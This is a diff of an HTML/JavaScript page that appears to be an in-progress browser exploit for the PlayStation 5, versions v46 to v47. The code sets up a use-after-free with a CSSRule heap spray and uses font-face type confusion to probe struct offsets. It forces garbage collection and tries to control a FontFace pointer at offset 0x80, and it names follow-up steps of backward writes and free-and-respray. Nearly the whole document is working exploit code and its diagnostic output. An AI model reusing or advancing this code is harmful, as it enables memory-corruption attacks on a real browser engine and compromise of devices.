@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v46 - Struct Field Mapper</title>
+<title>PS5 v47 - Option 1: Wrapper Force</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,7 +33,7 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v46 MAPPER</span><span class="s">│</span>
+<span class="l">▶ v47 OPTION 1</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">STAGE:<b>INIT</b></span>
 </div>
@@ -43,19 +43,23 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 "use strict";
 
 // ============================================================
-//  PS5 v46 — Struct Field Mapper
+//  PS5 v47 — Option 1: Wrapper Force Trigger
 //
-//  CRITICAL FIX: Only ONE load() call. Ever.
-//  v45 died because the second load() call triggered a fresh
-//  selector table lookup that cleaned up the dangling "x" entry.
+//  Goal: Force CSSFontFace::wrapper() to create a new FontFace
+//  and write its address to m_wrapper (offset 0x80).
 //
-//  Instead: get the FontFace reference from the first load(),
-//  then read properties directly from the FontFace object.
-//  On LLInt (no JIT), every property access calls the C++ getter,
-//  which reads from the live CSSFontFace. No caching.
-//
-//  All probes are SYNCHRONOUS within the same .then() callback.
-//  No Promise chaining. No second load(). No selector re-lookup.
+//  Strategy:
+//  1. Get aFace from load("1em trigger, x", "AB") — ONLY "x" lookup
+//  2. Verify confusion is alive (weight probe)
+//  3. Test A: load("1em A_NN", "B") — different family, no GC
+//     → Should return same aFace object (m_wrapper still valid)
+//     → Verify "x" confusion survives
+//  4. Test B: Release aFace, GC, load("1em A_NN", "B")
+//     → m_wrapper invalidated by GC
+//     → wrapper() creates new FontFace, writes to 0x80
+//     → Verify "x" confusion survives
+//  5. Test C: Last resort — load("1em trigger, x", "AB")
+//     → See if "x" confusion survives second "x" lookup
 // ============================================================
 
 var O=document.getElementById("out");
@@ -76,10 +80,7 @@ var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v46 — Struct Field Mapper","hd");
-P("  FIX: Single load() call only","hd");
-P("  FIX: Read from FontFace directly","hd");
-P("  FIX: All probes synchronous","hd");
+P("  v47 — Option 1: Wrapper Force","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -93,7 +94,7 @@ var sh=document.getElementById("s").sheet;
 var keep=[],holes=[],trigger=null,uafOk=false;
 
 // ============================================================
-//  PHASE 1: UAF + CSSRule Spray (identical to v42)
+//  PHASE 1: UAF + CSSRule Spray (identical to v46)
 // ============================================================
 
 pg(5);Hd("Creating holes...");
@@ -146,12 +147,10 @@ if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 
 pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();
 
-Dm("Calling load() — this is the ONLY load() call...");
+Dm("Calling load('1em trigger, x', 'AB') — ONLY 'x' lookup...");
 
 try {
-  var loadPromise = document.fonts.load("1em trigger, x", "AB");
-  
-  loadPromise.then(function(faces){
+  document.fonts.load("1em trigger, x", "AB").then(function(faces){
     P("  load() returned "+faces.length+" faces");
     P("");
     
@@ -175,9 +174,9 @@ try {
     
     St("RECLAIMED: "+aFamily);
     keep.push(faces);
-    keep.push(aFace);
+    // NOTE: We do NOT push aFace to keep — we want to be able to release it later
     
-    // Find A_NNN's CSSRule index
+    // Find A_NNN's CSSRule
     var aIndex = -1;
     var aNum = parseInt(aFamily.split("_")[1]);
     P("");
@@ -205,440 +204,232 @@ try {
     var aStyle = aRule.style;
     
     P("");
-    Ok("Strategy: Write to A_"+aNum+" CSSRule, read from FontFace directly");
-    Dm("NO second load() call — prevents selector cleanup");
-    Dm("LLInt has no JIT caching — every read calls C++ getter");
+    Ok("Strategy: load('1em "+aFamily+"', 'B') to trigger wrapper()");
+    Dm("This looks up '"+aFamily+"' — NOT 'x' — shouldn't disturb confusion");
     P("");
     
     // ============================================================
-    //  PHASE 3: Struct Field Mapper (ALL SYNCHRONOUS)
+    //  PHASE 3: Option 1 — Wrapper Force Trigger
     // ============================================================
     
-    pg(50);Sep();Hd("PHASE 3: Struct Field Mapper");Sep();
-    P("  Writing to CSSRule, reading from FontFace object directly","dm");
-    P("  All probes synchronous — no Promise chaining","dm");
+    pg(40);Sep();Hd("PHASE 3: Option 1 — Wrapper Force Trigger");Sep();
     P("");
     
-    var results = [];
-    var confirmedCount = 0;
-    var failedCount = 0;
-    
-    // Synchronous probe: write to CSSRule, read from FontFace
-    function syncProbe(cssName, writeVal, faceProp, expectedOff, desc, type) {
-      var key = cssName+'="'+writeVal+'"';
-      P("  ["+expectedOff+"] "+key+" ("+desc+")","dm");
-      
-      // Read baseline
-      var baseline = undefined;
-      try {
-        baseline = aFace[faceProp];
-      } catch(e) {
-        baseline = "ERR:"+e.message;
-      }
-      
-      // WRITE to A_NN's CSSRule
-      try {
-        aStyle.setProperty(cssName, writeVal);
-      } catch(e) {
-        Fl("    WRITE ERR: "+e.message);
-        results.push({name:key, off:expectedOff, desc:desc, type:type,
-          write:writeVal, error:"write: "+e.message, ok:false});
-        failedCount++;
-        P("");
-        return;
-      }
-      
-      // Force style recalculation
-      fs();
-      
-      // READ from FontFace object directly (NO load() call)
-      var readVal = undefined;
-      try {
-        readVal = aFace[faceProp];
-      } catch(e) {
-        readVal = "ERR:"+e.message;
-      }
-      
-      // Also try via getter directly (bypass any JS-level caching)
-      var readValGetter = undefined;
-      try {
-        var proto = Object.getPrototypeOf(aFace);
-        var desc2 = Object.getOwnPropertyDescriptor(proto, faceProp);
-        if(desc2 && desc2.get) {
-          readValGetter = desc2.get.call(aFace);
-        }
-      } catch(e) {
-        readValGetter = "ERR:"+e.message;
-      }
-      
-      // Also read what CSSRule reports
-      var cssVal = "";
-      try { cssVal = aStyle.getPropertyValue(cssName); } catch(e) {}
-      
-      // Check if write propagated
-      var writeStr = String(writeVal);
-      var readStr = String(readVal);
-      var getterStr = String(readValGetter);
-      var propagated = false;
-      
-      if(type === "numeric") {
-        var rn = parseFloat(readStr);
-        var wn = parseFloat(writeVal);
-        if(!isNaN(rn) && !isNaN(wn) && rn === wn) {
-          propagated = true;
-        }
-        // Also check string match (e.g., "700" vs "700")
-        if(readStr.indexOf(writeStr) !== -1) propagated = true;
-        // Check getter result too
-        var gn = parseFloat(getterStr);
-        if(!isNaN(gn) && !isNaN(wn) && gn === wn) {
-          propagated = true;
-        }
-      } else if(type === "float") {
-        var fv = parseFloat(readStr);
-        var wv = parseFloat(writeVal);
-        if(!isNaN(fv) && !isNaN(wv) && Math.abs(fv - wv) < 0.01) {
-          propagated = true;
-        }
-        // Check getter
-        var gv = parseFloat(getterStr);
-        if(!isNaN(gv) && !isNaN(wv) && Math.abs(gv - wv) < 0.01) {
-          propagated = true;
-        }
-      } else {
-        if(readStr.indexOf(writeStr) !== -1) propagated = true;
-        if(getterStr.indexOf(writeStr) !== -1) propagated = true;
-      }
-      
-      if(propagated) {
-        Ok("    baseline: "+baseline+" → read: "+readStr+" ✓");
-        if(readValGetter !== readVal) {
-          Dm("    getter: "+getterStr);
-        }
-        Dm("    cssRule: "+cssVal);
-        results.push({name:key, off:expectedOff, desc:desc, type:type,
-          write:writeVal, baseline:baseline, read:readStr, getter:getterStr,
-          css:cssVal, ok:true});
-        confirmedCount++;
-      } else {
-        Fl("    baseline: "+baseline+" → read: "+readStr+" ✗");
-        Dm("    getter: "+getterStr);
-        Dm("    cssRule: "+cssVal);
-        results.push({name:key, off:expectedOff, desc:desc, type:type,
-          write:writeVal, baseline:baseline, read:readStr, getter:getterStr,
-          css:cssVal, ok:false});
-        failedCount++;
-      }
-      
-      // Clean up
-      try { aStyle.removeProperty(cssName); } catch(e) {}
-      fs();
-      P("");
-    }
-    
-    // === WEIGHT (known good from v39-v42) ===
-    Hd("Offset 0x88: weight (KNOWN GOOD — sanity check)");
-    syncProbe("font-weight", "700", "weight",
-      "0x88", "weight (700 — known good)", "numeric");
-    
-    if(confirmedCount > 0) {
-      Ok("Weight probe passed! Confusion is alive!");
-      P("");
+    // === Step 1: Verify confusion is alive ===
+    Hd("Step 1: Verify confusion is alive");
+    aStyle.setProperty("font-weight", "700");
+    fs();
+    var w1 = aFace.weight;
+    P("  Write font-weight=700, read aFace.weight = "+w1);
+    if(String(w1) === "700") {
+      Ok("Confusion ALIVE — weight probe passed");
     } else {
-      Wr("Weight probe failed. Trying alternate read methods...");
-      P("");
+      Fl("Confusion DEAD — weight = "+w1+" (expected 700)");
+      P("  Aborting option 1.");
+      hu("h2","STAGE:<b>FAIL</b>");
+      return;
+    }
+    P("");
+    
+    // === Step 2: Test A — Second load() with DIFFERENT family (no GC) ===
+    pg(50);Hd("Step 2: Test A — load('1em "+aFamily+"', 'B') without GC");
+    Dm("Looking up '"+aFamily+"' instead of 'x'");
+    Dm("m_wrapper should still be valid → should return same aFace");
+    P("");
+    
+    document.fonts.load("1em "+aFamily, "B").then(function(faces2){
+      P("  load('1em "+aFamily+"', 'B') returned "+faces2.length+" faces");
       
-      // Try reading weight via Reflect
-      try {
-        var w = Reflect.get(aFace, "weight");
-        P("  Reflect.get weight: "+w,"dm");
-      } catch(e) {
-        P("  Reflect.get ERR: "+e.message,"er");
+      for(var i=0;i<faces2.length;i++){
+        var f=faces2[i];
+        P("  Face2["+i+"]: family="+f.family+" weight="+f.weight);
       }
       
-      // Try reading weight via getter
-      try {
-        var proto = Object.getPrototypeOf(aFace);
-        var desc = Object.getOwnPropertyDescriptor(proto, "weight");
-        if(desc && desc.get) {
-          var w2 = desc.get.call(aFace);
-          P("  Getter weight: "+w2,"dm");
-          if(String(w2).indexOf("700") !== -1) {
-            Ok("Getter read worked! Weight = 700");
-            confirmedCount++;
-            results.push({name:"font-weight=700 (getter)", off:"0x88",
-              desc:"weight (700 — getter)", type:"numeric",
-              write:"700", read:String(w2), ok:true});
+      // Check if any face is the same object as aFace
+      var sameObject = false;
+      var newFaceA = null;
+      for(var i=0;i<faces2.length;i++){
+        if(faces2[i] === aFace){
+          sameObject = true;
+          Ok("  Face2["+i+"] is SAME object as aFace");
+        } else if(faces2[i].family === aFamily){
+          newFaceA = faces2[i];
+        }
+      }
+      if(!sameObject){
+        if(newFaceA){
+          Wr("  Face2 is DIFFERENT object from aFace — wrapper() was called!");
+          Hi("  newFaceA.weight = "+newFaceA.weight);
+        } else {
+          P("  No matching face found","dm");
+        }
+      }
+      
+      // Verify "x" confusion is still alive
+      aStyle.setProperty("font-weight", "800");
+      fs();
+      var w2 = aFace.weight;
+      P("  Write font-weight=800, read aFace.weight = "+w2);
+      if(String(w2) === "800") {
+        Ok("  Confusion ALIVE after load('"+aFamily+"')");
+      } else {
+        Fl("  Confusion DEAD after load('"+aFamily+"')");
+        St("  Second load() killed confusion even with different family!");
+      }
+      P("");
+      
+      // Keep reference to newFaceA if it exists
+      if(newFaceA) keep.push(newFaceA);
+      
+      // === Step 3: Test B — Release aFace, GC, load() again ===
+      pg(60);Hd("Step 3: Test B — Release aFace, GC, load('"+aFamily+"')");
+      Dm("Releasing aFace reference...");
+      P("");
+      
+      // Release aFace — remove all references
+      aFace = null;
+      // Also clear from faces array reference
+      // faces is still in keep[] but that's the array, not individual face
+      
+      // Force GC with heavy allocation
+      Dm("Triggering GC (32MB pressure)...");
+      for(var i=0;i<8;i++){
+        var t=[];
+        for(var j=0;j<256;j++) t.push(new ArrayBuffer(65536));
+      }
+      fs();
+      Dm("GC done. m_wrapper should be invalidated now.");
+      P("");
+      
+      // Call load() with A_NN family — should trigger wrapper()
+      Dm("Calling load('1em "+aFamily+"', 'B')...");
+      
+      document.fonts.load("1em "+aFamily, "B").then(function(faces3){
+        P("  load('1em "+aFamily+"', 'B') returned "+faces3.length+" faces");
+        
+        for(var i=0;i<faces3.length;i++){
+          var f=faces3[i];
+          P("  Face3["+i+"]: family="+f.family+" weight="+f.weight);
+        }
+        
+        var newFaceB = null;
+        for(var i=0;i<faces3.length;i++){
+          if(faces3[i].family === aFamily || 
+             (faces3[i].family && faces3[i].family.indexOf("A_")===0)){
+            newFaceB = faces3[i];
           }
         }
-      } catch(e) {
-        P("  Getter ERR: "+e.message,"er");
-      }
-      P("");
-    }
-    
-    // === Full weight sweep ===
-    Hd("Offset 0x88: weight (full sweep)");
-    var weights = [100,200,300,400,500,600,800,900];
-    for(var wi=0; wi<weights.length; wi++) {
-      syncProbe("font-weight", String(weights[wi]), "weight",
-        "0x88", "weight ("+weights[wi]+")", "numeric");
-    }
-    
-    // --- m_family (0x20) ---
-    Hd("Offset 0x20: m_family");
-    syncProbe("font-family", "testFamProbe", "family",
-      "0x20", "m_family (RefPtr<CSSValue>)", "string");
-    
-    // --- m_ranges (0x28) ---
-    Hd("Offset 0x28: m_ranges");
-    syncProbe("unicode-range", "U+0000-007F", "unicodeRange",
-      "0x28", "m_ranges (Vector<UnicodeRange>)", "string");
-    
-    // --- m_featureSettings (0x40) ---
-    Hd("Offset 0x40: m_featureSettings");
-    syncProbe("font-feature-settings", "\"test\" 1", "featureSettings",
-      "0x40", "m_featureSettings", "string");
-    
-    // --- m_loadingBehavior (0x58) ---
-    Hd("Offset 0x58: m_loadingBehavior");
-    syncProbe("font-display", "block", "display",
-      "0x58", "m_loadingBehavior (block)", "enum");
-    syncProbe("font-display", "swap", "display",
-      "0x58", "m_loadingBehavior (swap)", "enum");
-    syncProbe("font-display", "fallback", "display",
-      "0x58", "m_loadingBehavior (fallback)", "enum");
-    syncProbe("font-display", "optional", "display",
-      "0x58", "m_loadingBehavior (optional)", "enum");
-    
-    // --- m_sizeAdjust (0x5C) — FLOAT ---
-    Hd("Offset 0x5C: m_sizeAdjust (FLOAT)");
-    syncProbe("size-adjust", "50", "sizeAdjust",
-      "0x5C", "m_sizeAdjust (50.0)", "float");
-    syncProbe("size-adjust", "73.5", "sizeAdjust",
-      "0x5C", "m_sizeAdjust (73.5)", "float");
-    syncProbe("size-adjust", "200", "sizeAdjust",
-      "0x5C", "m_sizeAdjust (200.0)", "float");
-    
-    // --- m_fontSelectionCapabilities.width ---
-    Hd("Offset 0x88+?: width");
-    syncProbe("font-stretch", "condensed", "stretch",
-      "0x88+4", "width (condensed)", "string");
-    syncProbe("font-stretch", "expanded", "stretch",
-      "0x88+4", "width (expanded)", "string");
-    
-    // --- m_fontSelectionCapabilities.slope ---
-    Hd("Offset 0x88+?: slope");
-    syncProbe("font-style", "italic", "style",
-      "0x88+8", "slope (italic)", "string");
-    syncProbe("font-style", "oblique 20deg", "style",
-      "0x88+8", "slope (oblique 20deg)", "string");
-    
-    // --- Additional probes ---
-    Hd("Additional fields");
-    syncProbe("font-variation-settings", "\"wght\" 400", "variationSettings",
-      "unknown", "variationSettings", "string");
-    syncProbe("ascent-override", "90%", "ascentOverride",
-      "unknown", "ascentOverride", "string");
-    syncProbe("descent-override", "110%", "descentOverride",
-      "unknown", "descentOverride", "string");
-    syncProbe("line-gap-override", "120%", "lineGapOverride",
-      "unknown", "lineGapOverride", "string");
-    
-    // ============================================================
-    //  PHASE 4: src Overflow Probe (SYNCHRONOUS — no load())
-    // ============================================================
-    
-    pg(80);Sep();Hd("PHASE 4: src Overflow Probe");Sep();
-    P("  Testing if Vector manipulation bleeds into adjacent fields...","dm");
-    P("  Reading weight from FontFace directly (no load())","dm");
-    P("");
-    
-    // Baseline weight
-    aStyle.setProperty("font-weight", "400");
-    fs();
-    var beforeWeight = aFace.weight;
-    P("  Baseline weight: "+beforeWeight,"dm");
-    
-    // Test 1: Long URL
-    P("");
-    Wr("Test 1: Long URL (4096 bytes)");
-    try {
-      var longUrl = "url('data:font/woff2;base64," + "A".repeat(4096) + "')";
-      aStyle.setProperty("src", longUrl);
-      fs();
-      var w1 = aFace.weight;
-      Ok("  Survived. weight="+w1);
-      if(String(beforeWeight) !== String(w1)) {
-        St("WEIGHT CHANGED! src write bled into weight!");
-        Hi("  Before: "+beforeWeight);
-        Hi("  After:  "+w1);
-      } else {
-        Dm("  Weight unchanged");
-      }
-    } catch(e) {
-      Fl("  Crash: "+e.message);
-    }
-    
-    // Test 2: Many srcs
-    P("");
-    Wr("Test 2: 64 comma-separated srcs");
-    try {
-      aStyle.setProperty("font-weight", "400");
-      fs();
-      var beforeW2 = aFace.weight;
-      
-      var manySrcs = [];
-      for(var i=0; i<64; i++) {
-        manySrcs.push("url('data:font/woff2;base64,"+String.fromCharCode(65+(i%26))+String(i)+"')");
-      }
-      aStyle.setProperty("src", manySrcs.join(", "));
-      fs();
-      var afterW2 = aFace.weight;
-      Ok("  Survived. weight="+afterW2);
-      
-      if(String(beforeW2) !== String(afterW2)) {
-        St("WEIGHT CORRUPTED! Vector overflow bled into weight field!");
-        Hi("  Before: "+beforeW2);
-        Hi("  After:  "+afterW2);
-      } else {
-        Dm("  Weight unchanged — no corruption detected");
-      }
-    } catch(e) {
-      Fl("  Crash: "+e.message);
-    }
-    
-    // Clean up
-    try { aStyle.removeProperty("src"); } catch(e) {}
-    try { aStyle.removeProperty("font-weight"); } catch(e) {}
-    fs();
-    
-    // ============================================================
-    //  PHASE 5: Analysis & Summary
-    // ============================================================
-    
-    pg(100);Sep();Hd("PHASE 5: Analysis & Summary");Sep();
-    P("");
-    
-    P("  FIELD MAP RESULTS:","hd");
-    P("  ┌─────────────────────────────────────────────────────┐");
-    
-    var byOffset = {};
-    for(var i=0; i<results.length; i++) {
-      var off = results[i].off || "unknown";
-      if(!byOffset[off]) byOffset[off] = [];
-      byOffset[off].push(results[i]);
-    }
-    
-    var offsets = Object.keys(byOffset).sort();
-    for(var oi=0; oi<offsets.length; oi++) {
-      var off = offsets[oi];
-      var probes = byOffset[off];
-      var anyOk = false;
-      for(var pi=0; pi<probes.length; pi++) {
-        if(probes[pi].ok) { anyOk = true; break; }
-      }
-      var mark = anyOk ? "✅" : "✘";
-      var names = probes.map(function(p){return p.name.split("=")[0]}).filter(function(v,i,a){return a.indexOf(v)===i});
-      P("  │ "+mark+" "+off+"  "+names.join(", "));
-    }
-    
-    P("  └─────────────────────────────────────────────────────┘");
-    P("");
-    P("  Confirmed R/W channels: "+confirmedCount,"ok");
-    P("  Failed probes:          "+failedCount,"er");
-    P("");
-    
-    // Key findings
-    P("  KEY FINDINGS:","hd");
-    P("");
-    
-    var weightOk = results.filter(function(r){return r.name.indexOf("font-weight")!==-1 && r.ok});
-    if(weightOk.length >= 7) {
-      Ok("  font-weight: "+weightOk.length+"/9 confirmed → m_fontSelectionCapabilities at 0x88 ✓");
-    } else if(weightOk.length > 0) {
-      Wr("  font-weight: "+weightOk.length+"/9 confirmed → partial match");
-    } else {
-      Fl("  font-weight: 0/9 → confusion not active or wrapper caching");
-    }
-    
-    var sizeOk = results.filter(function(r){return r.name.indexOf("size-adjust")!==-1 && r.ok});
-    if(sizeOk.length >= 2) {
-      Ok("  size-adjust: "+sizeOk.length+"/3 confirmed → m_sizeAdjust at 0x5C ✓");
-      Hi("  → FLOAT WRITES CONFIRMED. IEEE 754 probing is viable.");
-    } else {
-      Wr("  size-adjust: "+sizeOk.length+"/3 confirmed");
-    }
-    
-    var dispOk = results.filter(function(r){return r.name.indexOf("font-display")!==-1 && r.ok});
-    if(dispOk.length >= 2) {
-      Ok("  font-display: "+dispOk.length+"/4 confirmed → m_loadingBehavior at 0x58 ✓");
-    }
-    
-    var strOk = results.filter(function(r){return r.name.indexOf("font-stretch")!==-1 && r.ok});
-    if(strOk.length >= 1) {
-      Ok("  font-stretch: "+strOk.length+"/2 confirmed → width sub-field located");
-    }
-    
-    var stlOk = results.filter(function(r){return r.name.indexOf("font-style")!==-1 && r.ok});
-    if(stlOk.length >= 1) {
-      Ok("  font-style: "+stlOk.length+"/2 confirmed → slope sub-field located");
-    }
-    
-    var famOk = results.filter(function(r){return r.name.indexOf("font-family")!==-1 && r.ok});
-    if(famOk.length >= 1) {
-      Ok("  font-family: confirmed → m_family at 0x20 ✓");
-    }
-    
-    var rngOk = results.filter(function(r){return r.name.indexOf("unicode-range")!==-1 && r.ok});
-    if(rngOk.length >= 1) {
-      Ok("  unicode-range: confirmed → m_ranges at 0x28 ✓");
-    }
-    
-    P("");
-    
-    // Gap analysis
-    P("  GAP ANALYSIS:","hd");
-    P("");
-    P("  Source estimate places m_wrapper at offset 0x80.");
-    P("");
-    
-    if(confirmedCount > 0) {
-      P("  Confirmed fields and their offsets:");
-      for(var i=0; i<results.length; i++) {
-        if(results[i].ok) {
-          P("    "+results[i].off+": "+results[i].name+" ✓");
+        
+        if(newFaceB){
+          St("NEW WRAPPER CREATED!");
+          Ok("  newFaceB.family = "+newFaceB.family);
+          Ok("  newFaceB.weight = "+newFaceB.weight);
+          Hi("  → wrapper() was called!");
+          Hi("  → New FontFace pointer written to m_wrapper at 0x80!");
+          keep.push(newFaceB);
+          
+          // Verify "x" confusion is still alive using newFaceB
+          aStyle.setProperty("font-weight", "900");
+          fs();
+          var w3 = newFaceB.weight;
+          P("");
+          P("  Write font-weight=900 via CSSRule, read newFaceB.weight = "+w3);
+          if(String(w3) === "900") {
+            Ok("  Confusion ALIVE after GC + wrapper() creation!");
+            Hi("  WE CAN CONTROL WHEN m_wrapper IS UPDATED!");
+          } else {
+            Fl("  Confusion DEAD after GC + wrapper() creation");
+            Wr("  wrapper() may have triggered selector cleanup");
+          }
+        } else {
+          Fl("  No face returned after GC — CSSFontFace may have been freed");
+          Wr("  This means the selector 'A_NN' entry was cleaned up");
+          Wr("  But the 'x' confusion might still exist");
         }
-      }
-      P("");
-      P("  Fields between last confirmed probe and m_wrapper:");
-      P("    0x60-0x77: m_sources (Vector, 24 bytes) → 'src' property");
-      P("    0x78-0x7F: m_clients (WeakHashSet, 8 bytes) → NOT CSS-accessible");
-      P("    0x80-0x87: m_wrapper (WeakPtr<FontFace>) → THE TARGET");
-    }
-    
-    P("");
-    
-    if(confirmedCount > 0) {
-      St("★ STRUCT FIELD MAPPER COMPLETE ★");
-      P("");
-      P("  Confusion is ALIVE. Direct FontFace reads work.","ok");
-      P("  No second load() needed — selector not disturbed.","ok");
-    } else {
-      St("★ MAPPER INCOMPLETE — NO PROBES CONFIRMED ★");
-      P("");
-      Wr("If weight failed, the FontFace wrapper may be caching.");
-      Wr("Next step: try creating a NEW FontFace for 'x' family");
-      Wr("to get a fresh wrapper that reads from the confused object.");
-    }
-    
-    P("");
-    P("  Save the console output and send it back.","hl");
-    
-    hu("h2","STAGE:<b>DONE</b>");
+        P("");
+        
+        // === Step 4: Test C — Try load("1em trigger, x", "AB") ===
+        pg(80);Hd("Step 4: Test C — load('1em trigger, x', 'AB') [RISKY]");
+        Dm("This is the second 'x' lookup — may kill confusion");
+        Dm("Testing to see if confusion survives...");
+        P("");
+        
+        document.fonts.load("1em trigger, x", "AB").then(function(faces4){
+          P("  load('1em trigger, x', 'AB') returned "+faces4.length+" faces");
+          
+          for(var i=0;i<faces4.length;i++){
+            var f=faces4[i];
+            P("  Face4["+i+"]: family="+f.family+" weight="+f.weight);
+          }
+          
+          // Check if A_NN is still returned through "x" selector
+          var xAlive = false;
+          for(var i=0;i<faces4.length;i++){
+            if(faces4[i].family && faces4[i].family.indexOf("A_")===0){
+              xAlive = true;
+              Ok("  Face4["+i+"] is "+faces4[i].family+" — 'x' confusion ALIVE!");
+            }
+          }
+          if(!xAlive){
+            Fl("  No A_ face returned — 'x' confusion is DEAD");
+            St("  Second 'x' lookup killed the confusion");
+          }
+          P("");
+          
+          // === Step 5: Final summary ===
+          pg(100);Sep();Hd("Step 5: Summary — Option 1 Results");Sep();
+          P("");
+          
+          P("  RESULTS:","hd");
+          P("");
+          P("  Step 1: Baseline confusion    "+(String(w1)==="700"?"✅ ALIVE":"✘ DEAD"));
+          P("  Step 2: load(A_NN) no GC      "+(String(w2)==="800"?"✅ ALIVE":"✘ DEAD"));
+          
+          var step3Result = "❓";
+          if(newFaceB){
+            step3Result = (String(newFaceB.weight)==="900")?"✅ ALIVE":"✘ DEAD";
+          } else {
+            step3Result = "✘ NO FACE";
+          }
+          P("  Step 3: GC + load(A_NN)       "+step3Result);
+          P("  Step 4: load(trigger,x)       "+(xAlive?"✅ ALIVE":"✘ DEAD"));
+          P("");
+          
+          if(newFaceB){
+            Hi("  KEY FINDING: wrapper() was triggered successfully!");
+            Hi("  A new FontFace pointer was written to m_wrapper (0x80).");
+            Hi("  This proves we can control m_wrapper updates.");
+            P("");
+            Hi("  NEXT: Option 2 (backward write) or Option 3 (free+respray)");
+            Hi("  to read/overwrite the value at 0x80.");
+          } else if(String(w2)==="800"){
+            Hi("  Confusion survived load(A_NN) but GC may have freed the object.");
+            Hi("  NEXT: Try Option 2 (backward write) — no freeing needed.");
+          } else {
+            Wr("  Confusion died early. Need to adjust strategy.");
+          }
+          P("");
+          St("★ OPTION 1 COMPLETE ★");
+          
+          hu("h2","STAGE:<b>DONE</b>");
+          
+        }).catch(function(e){
+          Fl("Step 4 crashed: "+e.message);
+          hu("h2","STAGE:<b>CRASH</b>");
+        });
+        
+      }).catch(function(e){
+        Fl("Step 3 crashed: "+e.message);
+        hu("h2","STAGE:<b>CRASH</b>");
+      });
+      
+    }).catch(function(e){
+      Fl("Step 2 crashed: "+e.message);
+      hu("h2","STAGE:<b>CRASH</b>");
+    });
     
   }).catch(function(e){
-    Fl("Load crashed: " + e.message);
+    Fl("Phase 2 crashed: "+e.message);
     hu("h2","STAGE:<b>CRASH</b>");
   });
   
